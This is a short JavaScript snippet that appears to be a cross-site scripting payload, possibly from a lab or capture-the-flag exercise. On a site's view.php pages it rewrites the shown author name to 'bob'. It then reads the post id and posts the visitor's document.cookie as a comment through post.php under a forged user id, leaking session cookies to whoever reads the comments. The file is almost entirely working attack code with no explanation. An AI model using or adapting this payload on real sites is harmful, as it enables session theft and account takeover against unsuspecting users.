function bobify() { if (document.location.pathname.endsWith("view.php")) { let arr = document.querySelectorAll("#author")[0].textContent.split(" "); arr[2] = "bob"; document.querySelectorAll("#author")[0].textContent = arr.join(" ") } }


function getId() { if (document.location.pathname.endsWith("view.php")) { const param = new URLSearchParams(document.location.search); return param.get("id") } }

function leaveComment(id) { if (document.location.pathname.endsWith("view.php")) { const xhr = new XMLHttpRequest(); xhr.open("POST", "post.php", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send(`comment=${document.cookie}&form=comment&parent=${id}&uid=7&submit=`); } }